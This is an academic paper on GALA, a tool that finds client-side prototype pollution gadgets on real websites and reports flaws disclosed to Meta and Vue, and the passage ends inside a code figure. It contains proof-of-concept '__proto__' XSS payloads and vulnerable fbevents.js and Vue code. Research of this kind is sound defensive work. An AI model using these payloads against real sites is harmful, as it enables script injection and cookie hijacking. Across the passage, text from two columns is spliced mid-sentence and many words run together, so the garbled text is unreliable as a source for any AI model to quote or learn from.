@@ -1,0 +1,2106 @@
+=====================
+
+Follow My Flow: Unveiling Client-Side Prototype Pollution Gadgets from
+One Million Real-World Websites
+Zifeng Kang, Muxi Lyu, Zhengyu Liu, Jianjia Yu, Runqi Fan∗, Song Li∗, and Yinzhi Cao
+Johns Hopkins University
+∗ The State Key Laboratory of Blockchain and Data Security, Zhejiang University
+{zkang7, mlyu4, zliu192, jyu122, yinzhi.cao}@jhu.edu, {fanrunqi, songl}@zju.edu.cn
+Abstract—Prototype pollution vulnerability often has further or another originally-undefined property. These originally-
+consequences—such as Cross-site Scripting (XSS) and cookie undefined properties are manipulated by the adversary with
+manipulation—that are achieved via so-called gadgets, i.e., injected values, thus affecting the control- or data-flow of
+codesnippetsthatchangethecontrol-ordata-flowofavictim the victim program to achieve their malicious purpose, e.g.,
+program for malicious purposes. Prior works face challenges Cross-site Scripting (XSS) and Cookie Manipulation.
+in finding prototype pollution gadgets for such consequences Priorworksondetectingprototypepollutiongadgetscan
+because the control- or data-flow change sometimes needs be categorized into two types: static and dynamic. On one
+the injection of complex property values to replace existing hand,SilentSpring[6],amostlystaticapproach(withsome
+dynamic components to obtain undefined values), relies on
+undefinedonesthroughprototypepollution,whichmaynotbe
+CodeQL [7] to detect data flows between undefined prop-
+seen before or cannot be solved by existing constraint solvers.
+erties and sinks for server-side Node.js runtime. However,
+In this paper, we design a dynamic analysis framework,
+such a static approach has a large number of false positives
+called GALA, to automatically detect client-side prototype
+(FPs).Therefore,SilentSpringhastoresorttomanualanal-
+pollution gadgets among real-world websites, and implement
+ysis for exploit generation and filtering of FPs. Moreover,
+an open-source version of GALA. Our key insight is to
+Silent Spring only detects single but not chained gadgets.
+borrow existing defined values on non-vulnerable websites to
+On the other hand, researchers have proposed to use
+victim ones where such values are undefined, thus guiding the
+dynamic approaches to detect such gadgets. ProbetheP-
+property injection to flow to the sinks in gadgets.
+roto [4], the only study on client-side prototype pollution
+Our evaluation of GALA against one-million websites
+and their gadgets, adopts predefined payload as property
+reveals133zero-daygadgetsthatarenotfoundbypriorworks.
+values,whichisoftenrigid,leadingtomissedgadgetswhen
+Forexample,onegadgetwasfromMeta’ssoftwareandanother
+such values are not known before. Another work, UoPF [5]
+fromtheVueframework.Bothhaveacknowledgedandfixedit,
+adopts concolic execution to detect chained gadgets for
+withMetarewardingusabugbountyandVueassigningCVE-
+sever-sideNode.jstemplateengines.UoPFmarksundefined
+2024-6783. Our evaluation also shows that 23 websites with
+values as symbols and solves them using constraint solvers,
+prototypepollutionvulnerabilities—whichdonothavefurther
+such as Z3 [8]. However, existing solvers cannot scale to
+consequences as reported by prior works—have consequences
+complex constraints, which often fail to provide a valid
+due to gadgets found by GALA. In addition to the Meta solution within limited time. The application of UoPF upon
+and Vue gadgets, we also responsibly disclosed all the zero- client-side gadgets is also unknown since a client-side con-
+day gadgets and those newly-discovered prototype pollution colic execution framework needs to be developed.
+consequences to their developers. In this paper, we design a dynamic analysis framework
+named GALA (Gadget Locator and Analyzer), to detect
+1. Introduction client-side gadgets among one-million real-world websites.
+Our key insight is that (while some properties are undefined
+Prototype pollution [1]–[3] is a relatively new type of on certain websites), there are corresponding defined values
+vulnerability, which allows an adversary to manipulate a in other websites for a different functionality and such
+prototypicalobjectpropertyofavictimJavaScriptprogram. defined values flow to sinks. Therefore, GALA can follow
+Such vulnerabilities are prevalent in the real world: Prior the defined values and their flows to locate a gadget and
+work [4] has discovered thousands of top-ranked, vulner- guidetheadversary-injectedvalues(replacingtheoriginally-
+able websites. When a prototype pollution (vulnerability) undefined ones) to flow to the sink for exploitation. That is,
+is present, its exploitation for malicious consequence is GALA tackles the challenges in crafting complex values
+usually achieved with a concept, called prototype pollu- for undefined properties of victim websites faced by prior
+tion gadgets [5], [6] (or for short gadgets), i.e., a snippet works (which either do not have predefined values or fail
+of JavaScript code starting with an (originally-undefined to produce a value using constraint solvers) using defined
+property)andendingwitheitheraconsequence-relatedsink ones in other websites.
+
+Naturally, GALA has three phases: (i) locating unde- evaluation comprises zero-day gadgets, end-to-end exploits,
+finedproperties,(ii)assigningdefinedvaluesforpreviously- comparisonswithbaselines,performance,anablationstudy,
+undefined properties, and (iii) guiding undefined properties and an analysis for defined values. After that, we discuss
+using defined values. More specifically, first, in the “Un- a few issues, e.g., ethics, in Section 6 and present related
+defined Locating” Phase, GALA renders target websites works in Section 7. The paper concludes in Section 8.
+using a modified version of Chromium [9] to record all
+undefined properties. Second, in the “Defined Assigning” 2. Overview
+Phase, GALA locates the defined values for the undefined
+properties found in the first phase and tracks whether such
+Inthissection,westartbydescribingsomebackgrounds
+valuesflowtoasink.Lastly,inthe“Guiding”Phase,GALA
+of prototype pollution, followed by a motivating example
+uses the defined values to guide the undefined property in-
+and our threat model.
+jection.Suchaprocesscouldberepeatedbecauseadditional
+undefinedpropertiesmaybediscoveredalongthedataflow.
+2.1. Background
+We implemented an open-source prototype [10] of
+GALA and ran it on one million websites from the Tranco
+Prototype pollution, just like what is indicated in its
+list [11]. Our results reveal 133 zero-day gadgets that are
+name, allows an adversary to traverse through the prototype
+not found in prior works, including a zero-day gadget from
+chain—if an object lookup is controllable—and then inject
+software maintained by Meta and another from the Vue
+a malicious property under a prototypical object. A typical
+framework. We responsibly reported all the gadgets to their
+target will be the prototype of a built-in object, such as
+developers and so far four have been fixed. Among the de-
+Object.prototype and Function.prototype, be-
+velopers who fixed the reported gadgets, Meta further gave
+causetheyarethebaseobjectsofmanyotherJavaScriptob-
+us a bug bounty, and Vue assigned CVE-2024-6783 [12].
+jects.Asaconsequence,afollow-uplookuptoanoriginally-
+We also compared GALA with ProbetheProto and Silent
+undefined property lookup may result in the adversary-
+Spring using 1,000 websites. Our evaluation shows that
+injected value and an alteration of control- or data-flows.
+GALA detects all the gadgets found by ProbetheProto and
+Depending on how the control- or data-flow is changed to
+Silent Spring. In addition, GALA finds that 23 websites
+different sinks, the adversary may escalate a prototype pol-
+with prototype pollution vulnerability—which are reported
+lution via so-called gadgets to different consequences, such
+as no further consequences by prior work, specifically
+as Remote Code Execution (RCE) on the server side [3],
+ProbetheProto—are further vulnerable to consequences in-
+[5], [6] and XSS on the client side [1], [4], [13].
+cluding XSS and Cookie/URL manipulations.
+More specifically, a prototype pollution gadget, follow-
+ingpriorworks[5],[6],isdefinedasacodesnippet,starting
+1.1. Research Contributions
+from an undefined property and ending with either a sink
+or another undefined property. If a gadget starts from one
+Wemakethefollowingresearchcontributionsindesign-
+undefined property and ends up with a sink, the gadget is
+ing and implementing GALA:
+called a direct gadget; otherwise, if a gadget needs a few
+• We design a novel approach that borrows defined values undefined properties to finally reach the sink, the list of
+from different executions (e.g., on another website) to gadgets is defined as a gadget chain.
+guide adversary-injected values on originally undefined
+properties to flow to the sink and achieve prototype pol- 2.2. A Motivating Example
+lution consequences.
+• We evaluate GALA upon the top one million real-world
+Inthispart,wedescribeareal-world,zero-dayprototype
+websites: GALA discovered 133 zero-day gadgets that
+pollution gadget that GALA discovered as a motivating
+were not found by prior works before and 23 zero-day
+example. The gadget is located in software developed and
+end-to-end exploits that are caused by zero-day gadgets.
+maintained by Meta, called “fbevents.js”, which is respon-
+• Some of our findings have real-world impacts, which
+sible for sending website visitor data to Meta. The conse-
+have been acknowledged and fixed by developers, e.g.,
+quence of the gadget is called cookie manipulation, i.e., the
+Meta with bug bounties and Vue with CVE-2024-6783.
+injection and alteration of adversary-controlled cookies. We
+responsibly disclosed the gadget to Meta, who fixed it and
+1.2. Paper Organization gave us a bug bounty.
+Figure 1 shows the source code of this zero-day gadget.
+The rest of the paper is organized as follows. We first b[0] (Line 5) is originally undefined and thus controllable
+give an overview of GALA including some backgrounds, by an adversary via prototype pollution. The injected value
+a motivating example, and our threat model in Section 2. flows to Line 16 and then eventually Line 17, affecting
+Then, we introduce the core design of GALA including document.cookie. This gadget leads to a cookie ma-
+three phases in Section 3. Next, we describe the detailed nipulationconsequencein21real-worldwebsites.Sincethis
+implementation of GALA including different components is a tracking cookie, an adversary may hijack the cookie
+in Section 4. Then, we evaluate GALA in Section 5; the with their own value like a session fixation, thus potentially
+
+1 function p() {
+and therefore b[0] is undefined. GALA borrows the value
+2 var b = []; of b[0] from those websites where it is defined to pollute
+3 ... Original:undefined the victim website and detects the gadget.
+4 // Vulnerable code:
+5 - return b && typeof b[0] === "string" ? b[0] : ""
+6 // Patched code: Exploit:“fb.1.COOKIE.VALUE” 2.3. Threat Model
+7 + return b && Object.prototype.hasOwnProperty.call(
+b,0) && typeof b[0] === "string" ? b[0] : "" Our threat model assumes the existence of a prototype
+8 }
+9 function unpack(e) { pollution vulnerability, and then an adversary locates gad-
+10 var d = 4; gets to utilize the prototype pollution for further conse-
+11 e = e.split(".");
+quences. If an unknown prototype pollution indeed exists
+12 if (e.length !== d) Challengingconstraints
+13 return null; together with a gadget, we call the finding an end-to-end
+14 return e; exploit. Otherwise, we call the finding a gadget and if the
+15 }
+16 var a = unpack(p()); gadget is unknown before and cannot be detected by prior
+17 if (a) document.cookie = "_fbc=" + a.join(".") + ";"; works, it is called a zero-day. Our in-scope consequence is
+the same as prior work [4] on client-side gadgets and listed
+below:
+Figure 1: The vulnerable source code of a zero-day gad-
+• Cross-siteScripting(XSS).Anadversarypollutesapro-
+get found by GALA, which is located at https://connect.
+totypicalobjectsothatthepollutedvaluescanbeexecuted
+facebook.net/en US/fbevents.js. The gadget leads to cookie as JavaScript, e.g., through eval and innerHTML.
+manipulationin21real-worldwebsitesandhasalreadybeen
+• Cookie Manipulation. Adversary-polluted values can
+fixed by Meta (the patch code is shown in Line 7) after our
+manipulate the cookie jar of the victim’s website, e.g.,
+responsible disclosure. through document.cookie.
+• URL Manipulation [16], [17]. An adversary can manip-
+ulate the query string of a given URL, which may lead to
+stealing the victim’s future visit histories, or injecting their
+attacks like HTTP parameter pollution.
+own visit histories to the victim to impersonate the victim
+Note that the detection of gadgets apart from prototype
+on the target website [14], [15]. The consequence is also
+pollution vulnerabilities is indispensable just like the de-
+acknowledged by Meta as part of the reasons for the patch
+tection of gadgets for memory-related vulnerabilities [18]–
+and the bug bounty. The patched code is shown in Line 7,
+[21].Ononehand,awebsitewithgadgetsmaynotcurrently
+which checks whether the 0 property is native to b instead
+be vulnerable to prototype pollution, but could potentially
+of a prototypical object.
+become vulnerable if a script with prototype pollution is
+includedinthefuture.Ontheotherhand,anadversarymay
+2.2.1. Challenges and How GALA Solves Them. While
+curate a database of known gadgets and exploit prototype
+thegadgetseemsintuitivelysimple,itisverychallengingfor
+pollution with these gadgets.
+state-of-the-art approaches to detect and exploit the gadget
+duetoitscomplexconstraint(Lines11–13).Specifically,the
+2.3.1. Out-of-the-scopeProblems.Weconsiderthefollow-
+valueintheexploitneedstocontainthreedotssinceLine11
+ing problems as out of the scope of this paper.
+splitsthestringvaluebasedonthecharacterdotintoanarray
+• Server-side Gadgets. We consider server-side conse-
+andLine12checksthelengthofthearrayasfour.Letussee
+quences, e.g., command injection, and the detection of
+whystate-of-the-artapproachescannotdetectandexploitit.
+such gadgets are out of the scope of the paper, because
+First, ProbetheProto [4]—the only tool in detecting client-
+GALA analyzes top websites instead of server-side pack-
+side gadget—fails to fulfill the constraint at Line 11–13,
+ages.Onemayrefertopriorworks,e.g.,Liuetal.[5]and
+because it uses predefined values, e.g., commonly used
+Silent Spring [6], for the detection of server-side gadgets.
+XSS payload and random strings for cookie manipulation.
+• Detection of Prototype Pollution. We consider the de-
+Second, even if prior works on server-side gadgets—such
+tection and exploitation of the prototype pollution vul-
+as UoPF [5] and Silent Spring [6]—can hypothetically be
+nerability itself to be out of the scope of the paper,
+ported to the client side, they cannot detect and exploit the
+becausewemainlyfocusontheconsequenceofprototype
+gadget.Ononehand,existingconstraintsolvers,e.g.,Z3[8],
+pollution, i.e., the detection and exploitation of a gadget.
+do not support complex string operations, such as split.
+Onemayrefertopriorworks,e.g.,ProbetheProto[4],for
+Ontheotherhand,theclient-sidecodeheavilyusesdynamic
+detectiontechniques.Notethatwedoconsiderend-to-end
+features, which often fails existing static analysis.
+exploitsinthepaperbyusingprototypepollutiondetected
+Instead, GALA can detect and exploit the gadget be-
+by ProbetheProto [4] and zero-day gadgets detected by
+cause b[0] is defined in other websites with a concrete
+GALA.
+value containing three dots. Specifically, such a concrete
+valuecomesfromacookieofthesewebsites,named_fbc. 3. Design
+That is, these websites read this cookie using a regular
+expression, store them into the array b, update the cookie, In this section, we describe the design of GALA by
+and finally write back to document.cookie. As a com- introducing the overall system architecture and then three
+parison, the victim website does not have the _fbc cookie phases of GALA.
+
+Phase 1 Phase 3
+Instrumented
+HTML & JS JS Runtime
+from the ✅
+Target Site 😈
+Undefined Gadget
+Properties Validation
+Phase 2
+Gadgets
+Source
+✅
+HTML & JS Property Defined
+Web from Values Dynamic Values Sink
+Other Sites Instrumented Flow
+Crawler Taint
+JS Runtime Validation
+Engine
+Require for More Undefined Properties
+Figure 2: System Architecture of GALA. There are three major phases: (i) Locating undefined properties, (ii) Assigning
+defined values, and (iii) Guiding dataflows for originally undefined properties. In Phase 1, GALA runs an instrumented JS
+runtime to output all the undefined properties; in Phase 2, GALA finds corresponding defined values in other executions
+(which could exist in the same or a different website) and assigns such values to undefined ones in Phase 1; in Phase 3,
+GALA uses these defined values to guide the execution with previously undefined values to reach the sink and discover
+gadgets. All the gadgets are validated automatically using a generated payload to ensure corresponding consequences are
+achieved.
+3.1. System Architecture 3.2. Phase 1: Locating Undefined Properties
+In this phase, GALA treats each undefined property as
+the source of a potential (incomplete) flow to the sink func-
+The system architecture of GALA is shown in Figure 2 tion and records information related to undefined properties
+with three phases in the general workflow. In Phase 1, for later phases. The reason that GALA looks for such
+GALA detects and locates the undefined properties for use undefined properties because they can be manipulated by
+in Phase 2. Specifically, GALA adopts a web crawler to adversaries per our threat model, thus forming into gadgets.
+get main- and sub-pages following a list of top-ranked
+websites. Then, GALA records undefined properties and
+3.2.1. Detecting Undefined Properties. The first step is
+the incomplete control- or data-flows caused by undefined
+to detect undefined properties via an instrumented JS run-
+properties using an instrumented JavaScript runtime, i.e.,
+time with hooked property lookup APIs. Table 1 shows a
+V8’s Ignition [22]. In Phase 2, GALA discovers and as-
+list of such APIs from Ignition [22], the JavaScript inter-
+signs the corresponding defined values with the undefined
+preter in Chromium’s V8 engine. Note that GALA follows
+properties discovered in Phase 1. To achieve this, GALA
+JavaScript Specification [23] to hook different types of
+collects values from other websites that are using the same
+property lookups including both named (e.g., obj.name)
+JavaScript code and leverages a dynamic taint engine to
+and keyed (e.g., obj[key]).
+determine whether these values can contribute to a com-
+plete data flow, i.e., directly flowing to a sink or helping
+other values flow to the sink. Once GALA identifies such 3.2.2. Recording Undefined Properties. Once an unde-
+complete flows, GALA records the defined values for use fined property lookup is triggered via the instrumented
+in Phase 3. In Phase 3, GALA validates that the flows in JavaScriptruntime,thesecondstepofthisphaseisrecording
+the original website can be indeed guided by the unveiled the detailed information about the undefined properties into
+defined values. If such flow does not exist, GALA repeats thedatabaseforlateruseinPhase2.Theinformationisused
+the procedure Phase 1-3 to detect potential flows caused by tolocateandidentifytheundefinedproperty,whichconsists
+chained gadgets, i.e., needing more than one defined value of the website’s name, the name of the undefined property,
+tocompletethedataflow.Finally,aftertheflowisvalidated, the name and contents (in terms of hashes) of the involved
+GALA constructs corresponding payloads and outputs the function, the JavaScript file name, and the line number and
+detected gadget. offset of the property lookup statement.
+
+TABLE 1: A comprehensive list of property-related APIs
+hookedby GALA inIgnition[22]ofChromiumV8engine. 0 0 1 0 0 0 0 1
+“Phase Index” indicates in which Phase the hooked APIs
+are used.
+Sanitization Value
+Unused
+FunctionName NamespaceinV8 PhaseIndex Marker Taint
+ReadAbsentProperty Object 1 Figure 3: A representation of the value taint bits used in
+GetProperty Object 2&3
+GALA. In one byte, first three bits are used for sanitization
+GetDataProperty JSReceiver 1,2&3
+markers,thelastbitisusedforvaluetaint,andtheotherfour
+GetPropertyWithAccessor Object 2&3
+GetPropertyWithInterceptorInternal Object 2&3 bitsareunused.Thisfigureshowsthebyteforanadversary-
+GetObjectProperty Runtime 1,2&3 controllable property (the last bit is 1, i.e., tainted) but has
+KeyedGetObjectProperty v8::internal 2&3 been sanitized by hasOwnProperty (the first three bits
+are 001).
+3.3. Phase 2: Assigning Defined Values 3.3.3. Value Assignment. In this step, GALA matches
+defined and undefined values in different executions and
+Inthisphase,GALAdiscoversthedefinedvaluesofpre- assigns defined values to previously undefined properties.
+viouslyundefinedproperties,performsdynamictaintpropa- Such a matching and assignment are based on recorded
+gation, and then assigns such values to undefined properties information of two executions, which includes JavaScript
+for those websites in Phase 1. file name, function name and hashes, property name, and
+line number and offset. That is, if all the stored information
+3.3.1. DiscoveringDefinedValues.Inthisstep,GALAfirst matches, GALA will assign the identified defined values to
+locatesthosepropertiesintheseparateexecutionofthesame the previously undefined property.
+script, but elsewhere, e.g., another website or another call
+stack on the same website. Specifically, GALA leverages 3.4. Phase 3: Guiding Dataflow for Originally Un-
+instrumented JS runtime with hooked property-lookup APIs defined Properties
+as shown in Table 1 and outputs the property values if they
+are defined. There are two things worth noting here. First, In this phase, GALA guides the dataflow for the victim
+the number of APIs for Phase 2 is more than those for website with originally undefined properties with values
+Phase1,becausetherearemorefunctionstohandledefined assigned in Phase 2 so that the assigned values (i.e., those
+properties compared with undefined. Second, defined and injected by adversaries) can flow to the corresponding sink.
+undefined property lookups could be located in the same Then,GALAgeneratesapayloadbasedonthedataflowand
+script and website but with different call stacks. That is, the validatesthegadgetsfurtherbasedonthegeneratedpayload.
+samefunctioniscalledmorethanonce:somewithadefined
+valueandsomewithundefined.Suchdefinedvaluescanalso 3.4.1. Flow Validation. In this step, GALA validates
+help GALA in Phase 2. whether the assigned defined properties enable the origi-
+nal undefined lookup to successfully reach the sink. First,
+3.3.2. Dynamic Taint Propagation. In this step, GALA GALAmarkstheundefinedcandidateswiththecorrespond-
+marks defined properties discovered in the previous step as ingdefinedvaluesastainted.Next,GALAemploysdynamic
+taintedandpropagatesthetaintvalueuntilanotherundefined taintanalysistoperformtainttrackingonthepollutedvalues
+property is encountered or the taint reaches a sink. Figure 3 todetermineiftheyreachthesink.Ifthepollutedvaluesdo
+shows the design of the taint byte used for the taint value. not flow to the sink but new undefined properties emerge,
+The first three bits are used for sanitization markers, the GALA performstherecordingstepofPhase1torecordthe
+last bit the taint value, and the rest four unused. The taint property. Then, GALA repeats Phase 2 to discover further
+information is stored for each byte of a string, thus en- defined values if such values exist. In the end, when several
+suring precise taint propagation through operations such as iterations are repeated and the sink is reached, GALA
+string slicing and concatenation. The storage of sanitization recordsthetaintflow,includingalldefinedvaluesnecessary
+methodsisusedtomapsanitizationstodifferentfinalsinks: for the flow to reach the sink, and proceeds to payload
+A sanitization is considered as in place if it is used for generation.
+sanitizing values for the sink.
+There are two things worth noting here. First, the list 3.4.2. Payload Generation. In this step, GALA generates
+of sinks adopted by GALA follows prior works [4], [24]– payloadsbasedonthevalidatedflowfromthepreviousstep.
+[26].Morespecifically,GALAconsidersHTML,JavaScript, More specifically, there are two tasks: (i) constructing an
+Storage, and setAttribute, i.e., the consequence in- object structure for property chaining, and (ii) generating
+cludes Cross-site Scripting (XSS), URL manipulation, and propertyvaluestotriggerthesinkandtheconsequence(e.g.,
+cookie manipulation. Second, type conversion is also con- XSS and cookie/URL manipulations).
+sideredassanitization,e.g.,convertingastringtoaninteger First, GALA constructs an object structure based on
+will sanitize that input for further consequences like XSS. how a property is being looked up in the victim pro-
+
+gram. For example, GALA constructs a nested object like 4. Implementation
+{elem: {text: "polluted"}} for a chained prop-
+erty lookup such as obj.elem.text. Instead, if two We implemented a prototype of GALA with 4,627
+property lookups are in parallel, GALA will construct two lines of Python, 340 lines of C/C++, and 446 lines of
+objects with different properties. JavaScript. The prototype is open source on an anonymous
+Second, GALA generates property values following its repository [10]. We provide implementation details of the
+context values in the sink just like prior works [4], [25]– following components:
+[27]. That is, GALA adds closing tags or symbols so that
+• Crawler. We implemented the crawler using a Google
+the generated payload is syntactically correct. Note that
+Chrome extension with 143 lines of JavaScript. The
+we do not claim any research contributions for GALA in
+crawler visits all top one million domains in the Tranco
+comparison with prior works [4], [25]–[27] on the property
+list [11] generated on January 31, 2024 and navigates
+valuegeneration.Wenowdescribeitbasedondifferentsink
+through links embedded on the front page of each web
+types:
+domain until the crawler reaches 15 links deep, which is
+• JavaScript sinks (e.g., eval or new Function). five levels deeper than the maximum level of prior work,
+GALAadoptstwotechniques:(i)closingthecontext,and namely ProbetheProto [4].
+(ii)generatingcomputedproperty.First,GALAclosesthe • Overall Analysis and Database Storage. To ensure the
+string context, e.g., adding double quotes and commas flexibilityandperformanceofdataquerying,weadopteda
+to an object where the property value is controllable by local MongoDB server [28]. With 4,627 lines of Python
+an adversary. Second, GALA relies on computed prop- code, we established the data extractions, analysis, and
+erties, e.g., {[‘expression‘]: value}, to execute evaluations utilized by Phases 1, 2 and 3. Several fea-
+JavaScriptcodewhensuchapropertynameiscontrollable tures are included in our database design to facilitate the
+by an adversary. reliability and scalability of communications between the
+• HTML sinks (e.g., document.write and components of GALA and the database:
+innerHTML). Similar to JavaScript sinks, GALA (1) Database indexing by code-hashes: GALA uses a
+closes the context of an HTML string by adding closing third-party library SHA256 to hash each code-snippet.
+tags. The code-hashes are then used as the indices of database
+• Storage sinks (e.g., Cookies, Local Storage, and Session collections to save storage size and improve query effi-
+Storage). GALA borrows the storage contents obtained ciency.
+from another execution of the same script, if they are (2) Two-way communication: All asynchronous queries
+available. If not, GALA generates random values for establishdatabaseconnectionsusingPyMongoclientsdue
+storage sinks. to direct access and lower latency. At the same time, all
+• Attribute sinks (e.g., setAttribute). GALA gen- synchronous requests go to a local flask server for its
+extensibility.
+erates property values based on the attribute type and the
+controlled part of the property. Specifically, if the entire (3) Parallel processing: Given the large amount of
+value of src and href attributes can be controlled, data from 1M websites, we leveraged multi-threading
+GALA generates a data URL with code execution for whenever possible. To avoid race conditions when con-
+an XSS consequence. Otherwise, if only part of a URL, current threads interact with the database, we maintained
+e.g.,the querystringcan becontrolled, GALA appends a collection-level synchronization through atomic opera-
+new query string according to the property name and its tions.
+corresponding value, e.g., ?key=polluted, for URL • Instrumented JS Runtime and Dynamic Taint Analysis.
+manipulation [4], [17]. Both components are based on an instrumented Google
+Chromium, which is also used by prior works [4], [25].
+First,wedescribetheinstrumentedJSruntime.Following
+3.4.3. Gadget Validation. In this step, GALA injects the
+Table 1, the detected undefined properties are recorded
+generated payload from the previous step into the victim
+and later stored to the database asynchronously. This
+websiteviaprototypepollutionandcheckswhetherthecon-
+asynchronous pipeline helps maximize the speed of web-
+sequence is indeed triggered as a validation of the detected
+crawling and maintain the stability of database transac-
+gadget.Suchacheckingdependsondifferentconsequences:
+tion through rate-limiting and error-handling. Next, we
+• XSS. GALA executes a console.log with a unique describe the dynamic taint analysis. We implemented a
+stringandthencheckswhethersuchastringcanbefound taint byte in v8/include/v8.h for precise taint tracking. To
+in the console. perform dynamic taint analysis, GALA sets the defined
+• Cookie manipulation. GALA injects either a unique or values discovered in Phase 2 and injected in Phase 3
+a borrowed value into the cookie jar and then checks as tainted and propagates the taint. GALA then records
+whether the injected value exists. information of a taint flow and corresponding defined
+• URL manipulation. Similarly, GALA injects and checks values once the taint flows to a sink.
+whether a unique or a borrowed value exists in the query • FlowValidation.Withtheknowledgeofundefinedprop-
+string of a manipulated URL. ertiesfromPhase1andtheircorrespondingdefinedvalues
+
+from Phase 2, we developed a Google Chrome extension to detect any client-side gadgets. We adopt the original
+to inject the values to the targeted websites. We also source code and adapt it to incorporate client-side sinks
+implemented flow validation and payload generation in for detecting client-side gadgets.
+Python to construct payloads based on the defined values
+Datasets. We use the following datasets when evaluating
+and sink types of the validated flows. Furthermore, if the
+GALA.
+flow does not reach a sink but produces new undefined
+• 1M Websites. This contains top one million domains
+properties, GALA repeats Phase 2 with these new unde-
+from the Tranco List [11]. Specifically, GALA’s crawler
+fined properties for potential chained gadgets.
+processed8,594,700webpagesfromtheonemillionweb-
+• GadgetValidation.Weimplementedapayloadgenerator
+sites, creating a dataset for evaluation. We use the dataset
+to construct payloads according to the sink type and the
+to evaluate zero-day gadgets found by GALA as well as
+defined values of each gadget. For storage and attribute
+zero-day end-to-end exploits (RQ1 and RQ2). Note that
+sinks, we borrowed the approach of ProbetheProto [4].
+the crawler and taint engine were stable in processing
+For HTML and JavaScript sinks, we adapted the context-
+96.06% of websites without errors or crashes.
+aware exploit generator from prior work [26]. Finally,
+• 1KWebsites. Thiscontainstop1,000websitesfromthe
+we developed a Google Chrome extension to inject the
+Tranco List [11]. We use the dataset to compare GALA
+payloadtothetargetwebsiteonanofficialChromium[9]
+with baselines, i.e., RQ3, in terms of False Positives and
+to validate the gadget.
+evaluate GALA’s performance in RQ4.
+• BlackFan Dataset [13]. This is a gadget dataset with
+5. Evaluation ground truth information, which is manually curated by a
+Githubuserwithahandlercalled“BlackFan”.Atthetime
+In this section, we evaluate GALA and compare it with of paper writing, the dataset has 39 client-side prototype
+baselines. pollutiongadgets.Sincegroundtruthinformationisavail-
+able, we use the dataset to evaluate the False Negatives
+5.1. Research Questions and Experimental Setup of GALA and baselines.
+We describe the research questions (RQs) used in the 5.2. RQ1: Zero-day Gadgets Found by GALA
+evaluation and the experimental setup in choosing baselines
+In this research question, we answer the question of
+and datasets for these RQs.
+zero-day gadgets that are detected by GALA. Specifically,
+Research Questions (RQs). In this evaluation, we answer
+ourdefinitionofazero-daygadgetisthatthegadgetcannot
+the following research questions (RQs).
+be detected by any of prior works, e.g., ProbetheProto and
+• RQ1: How many zero-day gadgets (i.e., those are not SilentSpring,andithasnotbeendiscoveredmanually,e.g.,
+detectedorreportedbypriorworks)andzero-dayend-to- in the BlackFan dataset or anywhere online. Once GALA
+end exploits can GALA find? detectsagadget,wewillsearchonlinesources,e.g.,Github
+• RQ2: How many zero-day end-to-end exploits are there repository, to confirm this.
+among the zero-day gadgets found by GALA?
+• RQ3: What are the False Positives and Negatives of 5.2.1. StatisticsandBreakdowns.Intotal,GALAdetected
+GALA in comparison with baselines? 133 unique zero-day gadgets that exist in 5,413 real-world
+• RQ4: What is the performance of GALA? domains.Table2presentsaselectivelistofzero-daygadgets
+• RQ5: What are the impacts of GALA’s two found by GALA. Notably, some of the gadgets are found
+components—value replacement and exploit generator— in widely used libraries. For example, three gadgets that
+in the context of an ablation study? can lead to Cross-Site Scripting (XSS) are from Vue 2.6,
+• RQ6: What are the characteristics of the defined values whichisapopularsingle-pageapplication(SPA)framework.
+tested by GALA during the large-scale evaluation? Moreover, the 2.6 version is still used by millions of web-
+sites according to W3C [29]. Among the Vue 2.6 gadgets,
+Baselines. In the evaluation, we adopt the following two
+one is direct and the other two are chained.
+baselines in comparison with GALA. Table 3 also shows a breakdown of these gadgets based
+• ProbetheProto. ProbetheProto [4], a dynamic analysis on consequences. From the gadget perspective, XSS gad-
+tool, is designed to detect client-side prototype pollution get is the most popular, probably due to the extensive
+and its consequences (i.e., gadgets). That is, both the use of related sink functions, such as innerHTML and
+vulnerability and the consequence have to co-exist for a setAttribute, on the web to construct dynamic HTML
+website.WeadopttheoriginalsourcecodefromProbethe- pages and include third-party libraries. Then, URL manipu-
+Proto’s authors and add a prototype pollution extension lation comes next with 50 gadgets. Note that our definition
+to it, so that ProbetheProto can detect the gadgets even if here following prior works [17] is that an adversary can
+there is no prototype pollution. manipulate the query string instead of the full URL. If the
+• SilentSpring. SilentSpring[6],amostly-staticanalysis full URL is manipulable for a script tag, GALA considers
+tool, is designed to detect server-side prototype pollution it as XSS. Lastly, GALA finds the least number of gadgets
+andgadgets.Thatis,theoriginalSilentSpringisnotable with cookie manipulations.
+
+5.2.2. Case Studies. In this part, we give two case studies
+1 // Exploit: __proto__[’component’]=1&__proto__[’
+on gadgets found by GALA below. staticClass’]=’alert(1)})};//’
+2
+Case 1: Chained gadgets.Thefirstcasestudy,asshownin 3 function Ra(e, t) {
+Figure 4, is a chained gadget that GALA found in the Vue 4 n = "";
+5 if (e.component) // Undefined property 1
+2.6 library. These gadgets are control-flow dependent: the
+6 n = function(e, t, n) {
+second gadget, starting on line 18 with e.staticClass, 7 return "_c(" + e + "," + Va(t, n) + (r ?
+requires the pollution of the first gadget on line 4 with "," + r : "") + ")"
+8 }(e.component, e, t);
+e.component to alter the control flow. By default, 9 return n;
+e.componentisundefinedandthereforetheelsebranch 10 }
+11 function Va(e, t) {
+is executed. Polluting this first undefined property allows
+12 for (var i = 0; i < t.dataGenFns.length; i++)
+stepping into the if branch, enabling the second undefined 13 n += t.dataGenFns[i](e); // This dynamic
+property lookup within the genData function to be iden- function call invokes genData (Line 16)
+14 return n
+tified, whose value, if defined, will flow to the argument of 15 }
+the function constructor in function Ya. The dynamically 16 genData: function(e) {
+17 // Undefined property 2
+constructed function will be invoked later in the render
+18 return e.staticClass && (t += "staticClass:" + e.
+process of Vue-defined components. staticClass + ","), t
+Note that this is a challenging case due to two reasons. 19
+20 function Ya(e, t) {
+First,thefunctioncallatLine13isdynamic,i.e.,genData 21 return new Function(’with(this){return’ + Ra(e) +
+is a string as part of the t.dataGenFns array. There- ’}’);
+22 }
+fore, existing static analysis cannot locate this function call.
+Second, this is a chained gadget, meaning that only when
+e.component is defined, Va is invoked and therefore
+Figure 4: [RQ1] A case study of control-flow dependent
+e.staticClass flows to the sink (Line 21).
+chained gadget found in Vue 2.6 library by GALA.
+GALA found this gadget chain by utilizing the defined
+valuesinotherwebsites.Thatis,whene.componentand
+e.staticClass are defined in other websites, GALA 1 // Exploit: __proto__.ar = "<img src=1 onerror=alert
+(1)>"
+tracks the dataflow to the sink at Line 21. Such defined
+2
+values help GALA to find the chained gadgets. 3 var g = {}, t;
+4 var L = function(e) {
